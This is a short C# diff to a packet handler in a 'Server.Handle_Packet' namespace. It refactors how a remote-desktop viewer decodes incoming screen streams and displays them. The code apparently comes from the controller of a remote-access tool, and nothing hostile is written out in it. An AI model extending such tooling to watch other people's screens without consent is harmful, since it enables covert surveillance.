@@ -27,16 +27,17 @@ namespace Server.Handle_Packet
                             RD.labelWait.Visible = false;
                             RD.timer1.Start();
                             byte[] RdpStream0 = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
-                            Bitmap decoded0 = RD.decoder.DecodeData(new MemoryStream(RdpStream0));
-                            RD.rdSize = decoded0.Size;
                             int Screens = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
                             RD.numericUpDown2.Maximum = Screens - 1;
                         }
+
                         byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                         lock (RD.syncPicbox)
                         {
                             using (MemoryStream stream = new MemoryStream(RdpStream))
+                            {
                                 RD.GetImage = RD.decoder.DecodeData(stream);
+                            }
 
                             RD.pictureBox1.Image = RD.GetImage;
                             RD.FPS++;
